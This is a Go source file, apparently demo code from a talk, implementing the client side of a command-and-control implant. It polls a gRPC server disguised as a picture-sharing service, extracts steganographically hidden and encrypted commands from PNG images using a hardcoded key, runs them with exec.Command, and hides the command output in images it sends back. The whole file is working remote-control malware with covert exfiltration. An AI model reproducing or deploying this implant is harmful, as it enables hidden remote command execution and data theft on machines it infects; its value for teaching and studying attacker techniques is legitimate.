package main

import (
	"context"
	"flag"
	"fmt"
	"github.com/ThreeToes/golang-talk/c2/gen"
	"github.com/ThreeToes/golang-talk/encrypter"
	"github.com/ThreeToes/golang-talk/pnghider"
	"google.golang.org/grpc"
	"log"
	"os/exec"
	"strings"
	"time"
)

var payloadType = []byte("sNKY")
const CryptoKey = "SuperSecret"


func main() {
	// Setup our connection to the server
	addrF :=  flag.String("addr", "127.0.0.1", "Server address")
	portF := flag.Int("port", 5555, "Server port")

	toDial := fmt.Sprintf("%s:%d", *addrF, *portF)
	log.Printf("Connecting to %s", toDial)
	conn, err := grpc.Dial(toDial, grpc.WithInsecure())
	if err != nil { // OMIT
		log.Fatal("Could not dial server")// OMIT
	}// OMIT
	defer conn.Close()
	client := gen.NewPictureSharingClient(conn)
	// Main loop OMIT
	for {
		getPic, err := client.GetPicture(context.TODO(), &gen.GetPictureParameters{})
		if err != nil { // OMIT
			log.Fatalf("Error getting meme: %v", err) // OMIT
		}// OMIT
		if getPic.Id == "" {
			log.Printf("Nothing to do")
			time.Sleep(time.Millisecond * 500)
			continue
		}
		encryptedPayload, err := pnghider.RecoverPayload(payloadType, getPic.Data)
		if err != nil { // OMIT
			log.Fatalf("Could not recover payload: %v", encryptedPayload) // OMIT
		} // OMIT
		payload, err := encrypter.DecryptData(CryptoKey, encryptedPayload)
		if err != nil { // OMIT
			log.Fatalf("Could not decrypt payload: %v", err) // OMIT
		}// OMIT
		toRun := string(payload)
		log.Printf("Got command payload '%s'", toRun)
		split := strings.Split(toRun, " ")
		// We'll just... do a thing...
		cmd := exec.Command(split[0], split[1:]...)
		out, err := cmd.Output()
		if err != nil { // OMIT
			out = []byte(fmt.Sprintf("error running command: %v", err)) // OMIT
		}// OMIT
		returnPayload, err := pnghider.HidePayload(payloadType, out, getPic.Data)
		client.SayThankyou(context.TODO(), &gen.Thankyou{
			Id:             getPic.Id,
			AnotherPicture: returnPayload,
		})
	}
	// End main loop OMIT
}
